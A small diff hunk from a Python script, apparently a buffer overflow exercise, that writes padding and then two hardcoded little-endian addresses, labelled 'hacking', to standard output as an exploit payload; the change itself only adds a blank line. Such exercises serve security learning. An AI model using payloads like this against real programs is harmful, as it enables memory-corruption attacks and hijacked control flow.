@@ -12,5 +12,6 @@ sys.stdout.buffer.write(padding)
 
 a = 0x00007ffffff687c0.to_bytes(8, 'little')
 ptr_addr = 0x00007ffffff68fd8.to_bytes(8, 'little')
+
 hacking = a + ptr_addr
 sys.stdout.buffer.write(hacking)
